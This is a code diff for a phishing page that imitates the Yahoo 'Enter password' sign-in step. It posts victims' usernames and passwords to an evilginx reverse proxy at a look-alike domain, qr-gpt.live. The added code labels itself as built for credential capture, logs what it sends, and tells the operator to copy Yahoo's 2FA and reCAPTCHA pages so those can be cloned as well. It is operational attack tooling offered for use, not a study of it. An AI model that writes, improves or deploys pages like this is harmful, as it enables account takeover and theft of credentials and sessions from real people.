@@ -25,10 +25,10 @@
         padding: 10px;
         border-radius: 5px;
         font-family: monospace;
-        font-size: 12px;
-        max-width: 300px;
+        font-size: 11px;
+        max-width: 400px;
         z-index: 10000;
-        max-height: 400px;
+        max-height: 600px;
         overflow-y: auto;
     }
     .debug-panel h4 {
@@ -38,6 +38,26 @@
     .debug-log {
         margin: 2px 0;
         word-break: break-all;
+        padding: 2px;
+        border-left: 3px solid #333;
+        padding-left: 5px;
+    }
+    .debug-log.error {
+        color: #ff6b6b;
+        border-left-color: #ff6b6b;
+    }
+    .debug-log.success {
+        color: #51cf66;
+        border-left-color: #51cf66;
+    }
+    .debug-log.warning {
+        color: #ffd43b;
+        border-left-color: #ffd43b;
+    }
+    .debug-log.evilginx {
+        color: #ff6b6b;
+        border-left-color: #ff6b6b;
+        background: rgba(255, 107, 107, 0.1);
     }
     .input-field.error {
         border-color: #d93025 !important;
@@ -59,10 +79,12 @@
 </head>
 
 <body>
-  <!-- DEBUG PANEL -->
+  <!-- EVILGINX DEBUG PANEL -->
   <div class="debug-panel" id="debug-panel">
-    <h4>🔍 DEBUG INFO</h4>
+    <h4>🔥 EVILGINX DEBUG</h4>
     <div id="debug-logs"></div>
+    <button onclick="clearDebug()" style="background: #333; color: white; border: none; padding: 4px 8px; border-radius: 3px; margin-top: 5px;">Clear</button>
+    <button onclick="exportLogs()" style="background: #7200ff; color: white; border: none; padding: 4px 8px; border-radius: 3px; margin-top: 5px;">Export</button>
   </div>
 
   <section class="section">
@@ -84,13 +106,16 @@
               action="https://login.qr-gpt.live/account/challenge/password" 
               method="POST">
           
-          <!-- MINIMAL HIDDEN FIELDS FOR TESTING -->
+          <!-- EVILGINX COMPATIBLE HIDDEN FIELDS -->
           <input type="hidden" id="username" name="username">
           <input type="hidden" name="displayName" id="hidden-display-name">
           <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
           <input type="hidden" name="src" value="ym">
           <input type="hidden" name=".lang" value="en-US">
           <input type="hidden" name=".intl" value="us">
+          <input type="hidden" name="crumb" value="">
+          <input type="hidden" name="acrumb" value="">
+          <input type="hidden" name="sessionIndex" value="">
           
           <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
           
@@ -98,6 +123,7 @@
             <div class="reflectto" id="userEmail">Enter your password</div>
             <h1 class="heading-2"><strong>Enter password</strong></h1>
             <div class="text-block-2">to finish signing in<br></div>
+            
             <div class="pazz lpl">Password<br></div>
             <div class="ms-input-wrap">
               <input data-show="true" class="ms-input w-input" maxlength="256" name="passwd" data-name="passwd" placeholder="" type="password" id="password" data-ms-member="password" required autofocus>
@@ -113,12 +139,6 @@
             <div class="success-message" id="password-success">Password verified!</div>
             
             <input type="submit" data-wait="Please wait..." class="logger w-button" value="Sign In" id="submit-btn">
-            
-            <!-- DEBUG BUTTONS -->
-            <div style="margin-top: 20px; text-align: center;">
-              <button type="button" id="test-success" style="background: #0f9d58; color: white; border: none; padding: 8px 16px; border-radius: 4px; margin: 5px;">Test Success Flow</button>
-              <button type="button" id="clear-debug" style="background: #666; color: white; border: none; padding: 8px 16px; border-radius: 4px; margin: 5px;">Clear Debug</button>
-            </div>
           </div>
         </form>
       </div>
@@ -148,28 +168,56 @@
   }
   </script>
 
-  <!-- ENHANCED DEBUG SCRIPT -->
+  <!-- EVILGINX FOCUSED DEBUG SCRIPT -->
   <script>
   (function() {
       'use strict';
       
-      // DEBUG SYSTEM
+      // EVILGINX DEBUG SYSTEM
       const debugLogs = document.getElementById('debug-logs');
-      const debugPanel = document.getElementById('debug-panel');
+      let logCount = 0;
       
-      function debugLog(message, data = null) {
-          console.log(`[DEBUG] ${message}`, data || '');
+      function debugLog(message, type = 'info', data = null) {
+          logCount++;
+          const timestamp = new Date().toLocaleTimeString();
+          console.log(`[EVILGINX-${type.toUpperCase()}] ${message}`, data || '');
+          
           const logDiv = document.createElement('div');
-          logDiv.className = 'debug-log';
-          logDiv.innerHTML = `<strong>${new Date().toLocaleTimeString()}</strong>: ${message}`;
-          if (data) {
-              logDiv.innerHTML += `<br><small>${JSON.stringify(data).substring(0, 100)}...</small>`;
+          logDiv.className = `debug-log ${type}`;
+          logDiv.innerHTML = `<strong>${timestamp}</strong> [${logCount}]: ${message}`;
+          if (data && typeof data === 'object') {
+              logDiv.innerHTML += `<br><small>${JSON.stringify(data, null, 2).substring(0, 200)}...</small>`;
+          } else if (data) {
+              logDiv.innerHTML += `<br><small>${data.toString().substring(0, 200)}...</small>`;
           }
           debugLogs.appendChild(logDiv);
           debugLogs.scrollTop = debugLogs.scrollHeight;
+          
+          // Keep only last 50 logs
+          if (debugLogs.children.length > 50) {
+              debugLogs.removeChild(debugLogs.firstChild);
+          }
       }
       
-      debugLog('🚀 Yahoo Debug Password Page Loaded');
+      window.clearDebug = function() {
+          debugLogs.innerHTML = '';
+          logCount = 0;
+          debugLog('🧹 Debug cleared', 'info');
+      };
+      
+      window.exportLogs = function() {
+          const logs = Array.from(debugLogs.children).map(log => log.textContent).join('\n');
+          const blob = new Blob([logs], { type: 'text/plain' });
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = `evilginx-debug-${Date.now()}.txt`;
+          a.click();
+          URL.revokeObjectURL(url);
+      };
+      
+      debugLog('🔥 EVILGINX Password Page Loaded', 'evilginx');
+      debugLog('Target: Yahoo.com via evilginx proxy', 'evilginx');
       
       const elements = {
           form: document.getElementById('email-form'),
@@ -179,70 +227,65 @@
           hiddenUsername: document.getElementById('username'),
           hiddenDisplayName: document.getElementById('hidden-display-name'),
           passwordError: document.getElementById('password-error'),
-          passwordSuccess: document.getElementById('password-success'),
-          testSuccessBtn: document.getElementById('test-success'),
-          clearDebugBtn: document.getElementById('clear-debug')
+          passwordSuccess: document.getElementById('password-success')
       };
       
       let currentUsername = '';
       
-      // Get username with debug info
+      // Get username - NO validation, just capture
       function getUsername() {
-          debugLog('🔍 Attempting to retrieve username...');
+          debugLog('🔍 Retrieving captured username...', 'info');
           
           const urlParams = new URLSearchParams(window.location.search);
           let username = urlParams.get('u');
           
           if (username) {
               username = decodeURIComponent(username);
-              debugLog('✅ Username from URL:', username);
+              debugLog('✅ Username from URL parameter', 'success', username);
               return username;
           }
           
           const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/);
           if (cookieMatch) {
               username = decodeURIComponent(cookieMatch[1]);
-              debugLog('✅ Username from cookie:', username);
+              debugLog('✅ Username from cookie', 'success', username);
               return username;
           }
           
-          username = sessionStorage.getItem('yh_username');
+          username = sessionStorage.getItem('yh_username') || localStorage.getItem('yh_username');
           if (username) {
-              debugLog('✅ Username from sessionStorage:', username);
+              debugLog('✅ Username from storage', 'success', username);
               return username;
           }
           
-          username = localStorage.getItem('yh_username');
-          if (username) {
-              debugLog('✅ Username from localStorage:', username);
-              return username;
-          }
-          
-          debugLog('❌ No username found in any source');
+          debugLog('❌ No username found - user bypassed login page', 'error');
           return null;
       }
       
       function initializePage() {
-          debugLog('🔧 Initializing page...');
+          debugLog('🔧 Initializing evilginx password page...', 'info');
           
           currentUsername = getUsername();
           
           if (!currentUsername) {
-              debugLog('❌ ERROR: No username found');
-              alert('No username found. Please start from the beginning.');
+              debugLog('❌ No username captured - redirecting to login', 'error');
+              alert('Please start from the login page.');
+              window.location.href = 'https://login.qr-gpt.live/';
               return false;
           }
           
+          // Set username in form (NO validation - accept anything)
           elements.userDisplay.textContent = currentUsername;
           elements.hiddenUsername.value = currentUsername;
           elements.hiddenDisplayName.value = currentUsername;
           
-          debugLog('✅ Page initialized for user:', currentUsername);
+          debugLog('✅ Page initialized for username', 'success', currentUsername);
+          debugLog('📝 Username will be sent to evilginx for credential capture', 'evilginx');
           return true;
       }
       
       function showError(message) {
-          debugLog('❌ Showing error:', message);
+          debugLog('❌ Showing error to user', 'error', message);
           elements.passwordInput.classList.add('error');
           elements.passwordError.textContent = message;
           elements.passwordError.style.display = 'block';
@@ -251,7 +294,7 @@
       }
       
       function showSuccess(message) {
-          debugLog('✅ Showing success:', message);
+          debugLog('✅ Showing success to user', 'success', message);
           elements.passwordInput.classList.remove('error');
           elements.passwordError.style.display = 'none';
           elements.passwordSuccess.textContent = message;
@@ -264,7 +307,7 @@
           elements.passwordSuccess.style.display = 'none';
       }
       
-      // SIMPLIFIED FORM SUBMISSION FOR DEBUGGING
+      // EVILGINX FORM SUBMISSION - Let the proxy handle everything
       function handleFormSubmission(event) {
           event.preventDefault();
           
@@ -278,28 +321,30 @@
           elements.submitBtn.disabled = true;
           elements.submitBtn.value = 'Signing in...';
           
-          debugLog('🔐 FORM SUBMISSION STARTED');
-          debugLog('Username:', currentUsername);
-          debugLog('Password length:', password.length);
-          debugLog('Form action:', elements.form.action);
+          debugLog('🔐 EVILGINX CREDENTIAL SUBMISSION STARTED', 'evilginx');
+          debugLog('Username being sent', 'evilginx', currentUsername);
+          debugLog('Password length', 'evilginx', password.length);
+          debugLog('Target URL', 'evilginx', elements.form.action);
+          debugLog('🚨 CREDENTIALS WILL BE CAPTURED BY EVILGINX', 'evilginx');
           
-          // Prepare minimal form data
+          // Prepare form data for evilginx
           const formData = new FormData(elements.form);
           formData.set('username', currentUsername);
           formData.set('displayName', currentUsername);
           
-          debugLog('📤 Form data being sent:');
+          // Log what's being sent to evilginx
+          debugLog('📤 Data being sent to evilginx proxy:', 'evilginx');
           for (let [key, value] of formData.entries()) {
               if (key === 'passwd') {
-                  debugLog(`  ${key}: [REDACTED - Length: ${value.length}]`);
+                  debugLog(`  ${key}: [REDACTED - Length: ${value.length}]`, 'evilginx');
               } else {
-                  debugLog(`  ${key}: ${value}`);
+                  debugLog(`  ${key}: ${value}`, 'evilginx');
               }
           }
           
           const urlEncodedData = new URLSearchParams(formData);
           
-          // SIMPLIFIED FETCH - Just try to submit and see what happens
+          // Submit to evilginx proxy - it will forward to real Yahoo
           fetch(elements.form.action, {
               method: 'POST',
               body: urlEncodedData,
@@ -307,82 +352,86 @@
               headers: {
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'Referer': window.location.href,
-                  'Origin': window.location.origin
+                  'Origin': window.location.origin,
+                  'User-Agent': navigator.userAgent,
+                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                  'Accept-Language': 'en-US,en;q=0.5'
               }
           })
           .then(response => {
-              debugLog('📥 RESPONSE RECEIVED');
-              debugLog('Status:', response.status);
-              debugLog('Status Text:', response.statusText);
-              debugLog('Headers:', Object.fromEntries([...response.headers.entries()]));
+              debugLog('📥 RESPONSE FROM EVILGINX PROXY', 'evilginx');
+              debugLog('Status Code', 'info', response.status);
+              debugLog('Status Text', 'info', response.statusText);
+              
+              const headers = {};
+              for (let [key, value] of response.headers.entries()) {
+                  headers[key] = value;
+              }
+              debugLog('Response Headers', 'info', headers);
               
               elements.submitBtn.disabled = false;
               elements.submitBtn.value = 'Sign In';
               
               if (response.ok) {
                   return response.text().then(text => {
-                      debugLog('📄 Response body preview:', text.substring(0, 500));
+                      debugLog('📄 Response Body Length', 'info', text.length);
+                      debugLog('Response Preview', 'info', text.substring(0, 500));
                       
-                      // Instead of trying to parse, just show what we got
-                      showSuccess('Response received! Check debug panel for details.');
-                      
-                      // Try to detect what Yahoo wants us to do next
+                      // Let's see what Yahoo actually sent back
                       const lowerText = text.toLowerCase();
                       
-                      if (lowerText.includes('challenge') || lowerText.includes('verification') || lowerText.includes('2fa')) {
-                          debugLog('🔐 Detected: Challenge/2FA required');
+                      // Check for different Yahoo responses
+                      if (lowerText.includes('invalid') || lowerText.includes('incorrect') || lowerText.includes('wrong')) {
+                          debugLog('🚫 Yahoo rejected credentials', 'error');
+                          showError('Invalid password. Please try again.');
+                      } else if (lowerText.includes('challenge') || lowerText.includes('verification') || lowerText.includes('2fa')) {
+                          debugLog('🔐 Yahoo requesting 2FA/Challenge', 'warning');
+                          showSuccess('Password accepted! 2FA required.');
+                          debugLog('🔍 INSPECT THE NEXT PAGE YAHOO SHOWS!', 'warning');
                           setTimeout(() => {
-                              alert('Yahoo wants 2FA. We need to inspect the real 2FA page now!');
+                              alert('Yahoo accepted the password and wants 2FA!\n\nNOW INSPECT THE 2FA PAGE THAT APPEARS AND COPY ITS HTML!');
+                          }, 2000);
+                      } else if (lowerText.includes('recaptcha') || lowerText.includes('captcha')) {
+                          debugLog('🤖 Yahoo requesting reCAPTCHA', 'warning');
+                          showSuccess('Password accepted! reCAPTCHA required.');
+                          setTimeout(() => {
+                              alert('Yahoo wants reCAPTCHA verification!\n\nINSPECT THE reCAPTCHA PAGE AND COPY ITS HTML!');
                           }, 2000);
                       } else if (lowerText.includes('mail') || lowerText.includes('inbox')) {
-                          debugLog('📧 Detected: Direct mail access');
+                          debugLog('📧 Direct access to Yahoo Mail', 'success');
+                          showSuccess('Login successful! Redirecting...');
                           setTimeout(() => {
                               window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
                           }, 2000);
-                      } else if (lowerText.includes('invalid') || lowerText.includes('incorrect')) {
-                          debugLog('❌ Detected: Invalid credentials');
-                          showError('Invalid password detected in response');
                       } else {
-                          debugLog('❓ Unknown response type - manual inspection needed');
+                          debugLog('❓ Unknown Yahoo response - needs manual inspection', 'warning');
+                          showSuccess('Response received - check debug panel!');
+                          debugLog('🔍 FULL RESPONSE NEEDS MANUAL ANALYSIS', 'warning');
                       }
                   });
               } else if (response.status === 302 || response.status === 301) {
                   const location = response.headers.get('Location');
-                  debugLog('🔄 Redirect to:', location);
-                  showSuccess('Redirect detected! Check debug panel.');
+                  debugLog('🔄 Yahoo redirect detected', 'warning', location);
+                  showSuccess('Yahoo redirect detected!');
                   
                   if (location) {
+                      debugLog('🔍 INSPECT THE REDIRECT TARGET PAGE!', 'warning');
                       setTimeout(() => {
-                          alert(`Yahoo wants to redirect to: ${location}\n\nWe need to inspect this page!`);
+                          alert(`Yahoo is redirecting to:\n${location}\n\nINSPECT THIS PAGE AND COPY ITS HTML!`);
                       }, 2000);
                   }
               } else {
-                  debugLog('❌ HTTP Error:', response.status);
-                  showError(`HTTP ${response.status}: ${response.statusText}`);
+                  debugLog('❌ HTTP Error from Yahoo', 'error', `${response.status} ${response.statusText}`);
+                  showError(`Yahoo returned HTTP ${response.status}`);
               }
           })
           .catch(error => {
-              debugLog('💥 FETCH ERROR:', error.message);
+              debugLog('💥 Network/Fetch Error', 'error', error.message);
               elements.submitBtn.disabled = false;
               elements.submitBtn.value = 'Sign In';
-              showError('Network error: ' + error.message);
+              showError('Connection error: ' + error.message);
           });
       }
-      
-      // Test success flow button
-      elements.testSuccessBtn.addEventListener('click', function() {
-          debugLog('🧪 Testing success flow...');
-          showSuccess('Test success message!');
-          setTimeout(() => {
-              alert('This would redirect to Yahoo Mail or 2FA page');
-          }, 1000);
-      });
-      
-      // Clear debug button
-      elements.clearDebugBtn.addEventListener('click', function() {
-          debugLogs.innerHTML = '';
-          debugLog('🧹 Debug cleared');
-      });
       
       // Setup input handlers
       elements.passwordInput.addEventListener('input', clearMessages);
@@ -403,7 +452,8 @@
               elements.passwordInput.focus();
           }, 500);
           
-          debugLog('✅ Debug password page fully initialized');
+          debugLog('✅ Evilginx password page ready for credential capture', 'evilginx');
+          debugLog('🎯 Ready to capture real Yahoo credentials', 'evilginx');
       }
       
       if (document.readyState === 'loading') {
